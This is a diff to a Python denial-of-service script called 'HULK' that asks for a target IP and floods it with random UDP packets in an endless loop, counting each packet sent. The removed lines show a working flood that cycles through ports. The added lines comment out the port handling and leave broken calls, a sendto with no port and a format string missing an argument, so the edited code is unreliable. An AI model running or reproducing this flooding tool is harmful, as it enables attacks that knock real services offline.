@@ -26,7 +26,7 @@ bytes = random._urandom(1490)
 os.system("clear")
 #Type your ip and port number (find IP address using nslookup or any online website) 
 ip = input(" [+] HULK NEED IP : ")
-port = eval(input(" [+] HULK SMASH WHICH PORT : "))
+# port = eval(input(" [+] HULK SMASH WHICH PORT : "))
 os.system("clear")
 print(f'''
     ************************************************
@@ -36,7 +36,7 @@ print(f'''
     *           |_||_|\___/|____|_|\_\             *
     *                                              *
     *          HTTP Unbearable Load King           *
-              HULK SMASH {ip}:{port}           
+              HULK SMASH {ip}:port           
     *                                              *
     ************************************************
 
@@ -58,11 +58,11 @@ time.sleep(5)
 sent = 0
 try :
  while True:
-		sock.sendto(bytes, (ip, port))
+		sock.sendto(bytes, (ip))
 		sent = sent + 1
-		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
-		if port == 65534:
-			port = 1
+		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip))
+		# if port == 65534:
+		# 	port = 1
 except KeyboardInterrupt:
 	print(" ")
 	print("\n [-] Ctrl+C Detected.........Hulk Stop")
